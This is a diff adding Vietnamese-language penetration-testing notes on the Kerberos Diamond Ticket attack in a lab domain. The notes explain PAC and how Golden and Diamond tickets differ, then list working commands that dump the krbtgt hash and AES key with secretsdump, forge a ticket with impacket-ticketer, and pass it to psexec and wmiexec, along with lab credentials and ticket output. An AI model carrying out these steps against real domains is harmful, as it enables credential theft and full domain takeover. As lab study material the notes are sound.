@@ -1,0 +1,124 @@
+PAC (Privilege Attribute Certificate) là một phần dữ liệu nằm bên trong Kerberos ticket, dùng để chứa thông tin quyền hạn của user.
+
+
+Khi user đăng nhập domain:
+
+Domain Controller / KDC xác thực user
+KDC tạo một Kerberos TGT
+Bên trong TGT sẽ có PAC
+
+PAC chứa các thông tin như:
+
+Username
+SID (Security Identifier)
+Group memberships (Domain Admins, Users,…)
+User privileges
+Logon time
+Extra SIDs / delegated rights
+
+
+
+Khi bạn truy cập:
+
+File Server
+SQL Server
+Remote Desktop
+IIS
+SMB share
+
+service đó thường KHÔNG hỏi lại Domain Controller:
+
+“User này có thật là admin không?”
+
+Thay vào đó, service chỉ đọc PAC trong ticket và tin tưởng nó.
+
+
+QUY TRÌNH
+Attacker có account hợp lệ
+Xin TGT thật từ KDC
+Giải mã ticket
+Chỉnh sửa PAC (ví dụ thêm Domain Admins)
+Re-sign ticket bằng key phù hợp
+Dùng ticket mới để leo quyền
+
+
+Golden ticket thì nó  fake 100% tgt -> dễ có các field bất thường
+Diamond ticket thì nó dựa trên tgt thật rồi sửa một vài field cần thiết -> được tin cậy hơn
+
+
+
+
+Attacker sử dụng KRBTGT AES hash để decrypt một valid TGT -> thay đổi thông tin PAC trong TGT -> re-encrypting cái TGT đã bị sửa đổi với KRBTGT AES hash 
+
+
+
+*******************
+impacket-secretsdump pentest.local/Administrator:'admin@123!'@192.168.119.2 -just-dc-user krbtgt
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d0e4ebd945c1cb5467209c7f04505240:::
+Có thông tin: krbtgt:aes256-cts-hmac-sha1-96:97ca84f4abba04f374c1df7544cb37eff9d18d4822c89d18aaf4b53f65a83546
+Đây là KRBTGT AES256 key, Dùng để:
+decrypt TGT
+parse PAC
+forge Diamond Ticket
+forge AES Golden Ticket
+sign/re-sign Kerberos tickets
+
+
+Lấy domain sid:
+nxc ldap 192.168.119.2 -u Administrator -p admin@123! --get-sid
+S-1-5-21-2958292955-1953675188-783438268
+
+Tạo giả một TGS & PAC, gán cho Administrator có quyền sở hữu ticket này
+impacket-ticketer -request -domain 'pentest.local' -user 'Administrator' -password 'admin@123!' -nthash 'd0e4ebd945c1cb5467209c7f04505240' -aesKey '97ca84f4abba04f374c1df7544cb37eff9d18d4822c89d18aaf4b53f65a83546' -domain-sid 'S-1-5-21-2958292955-1953675188-783438268' Administrator
+-> Cái này nó tạo ra một Golden ticket (nếu không có -request thì nó là một Golden ticket, nghĩa là tạo ra một TGT giả ngay từ đầu luôn), vì có -request nên nó yêu cầu lấy TGT thật ban đầu từ KDC rồi thực hiện: decrypt ticket -> modify PAC -> re-sign ticket (ngoài ra nó còn cấp -aesKey để thực hiện cho quá trình decrypt/re-sign AES tickets)
+
+
+Thực hiện Pass the ticket
+export KRB5CCNAME=Administrator.ccache 
+impacket-psexec pentest.local/Administrator@dc2016.pentest.local -dc-ip 192.168.119.2 -target-ip 192.168.119.2 -k -no-pass
+impacket-wmiexec pentest.local/Administrator@dc2016.pentest.local -dc-ip 192.168.119.2 -target-ip 192.168.119.2 -k -no-pass
+
+
+************************************************************
+Những phần trên là có những thông tin và thực hiện các kỹ thuật trên một máy khác (kali)
+Trong trường hợp có được máy và chạy mimikatz/rubeus/... trên chính máy đó để thực hiện
+
+
+***********************************************************
+Xem thông tin của ticket
+
+impacket-describeTicket ticket.ccache
+Rubeus.exe dump
+kerberos::list
+klist 
+klist tickets
+rubeus.exe describe
+
+impacket-describeTicket ticket.ccache
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : f74ce0c471106524769a0fd363585b4d
+[*] User Name                     : Administrator
+[*] User Realm                    : PENTEST.LOCAL
+[*] Service Name                  : krbtgt/pentest.local
+[*] Service Realm                 : PENTEST.LOCAL
+[*] Start Time                    : 15/05/2026 23:15:26 PM
+[*] End Time                      : 16/05/2026 09:15:26 AM (expired)
+[*] RenewTill                     : 22/05/2026 23:15:26 PM
+[*] Flags                         : (0x40e10000) forwardable, renewable, initial, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : 90zgxHEQZSR2mg/TY1hbTQ==
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/pentest.local
+[*]   Service Realm               : PENTEST.LOCAL
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+
+
+
+Ticket Session Key: f74ce0c471106524769a0fd363585b4d
+Mô tả: Khóa đối xứng (session key) được tạo ra cho phiên làm việc giữa client và KDC (Key Distribution Center).
+Tác dụng: Dùng để mã hóa/decrypt authenticator và bảo vệ giao tiếp giữa client với KDC khi sử dụng ticket này. Đây là khóa riêng cho ticket, không phải long-term key.
+
